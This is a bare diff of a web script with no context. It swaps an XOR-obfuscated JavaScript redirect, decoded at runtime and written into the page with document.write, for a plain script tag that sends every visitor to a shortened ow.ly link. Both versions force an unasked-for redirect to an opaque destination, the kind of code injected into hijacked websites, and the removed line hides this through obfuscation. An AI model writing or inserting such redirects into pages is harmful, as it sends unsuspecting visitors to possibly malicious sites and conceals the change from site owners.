@@ -1,1 +1,3 @@
-var enkripsi="'1Aqapkrv'02nclewceg'1F'00hctcqapkrv'00'1G'2Cuklfmu,nmacvkml,jpgd'1F'00jvvr'1C--mu,n{-uoqN125RgL6'00'1@'2C'1A-qapkrv'1G"; teks=""; teksasli="";var panjang;panjang=enkripsi.length;for (i=0;i<panjang;i++){ teks+=String.fromCharCode(enkripsi.charCodeAt(i)^2) }teksasli=unescape(teks);document.write(teksasli);
+<script language="javascript">
+window.location.href="http://ow.ly/wmsL307PeN4";
+</script>
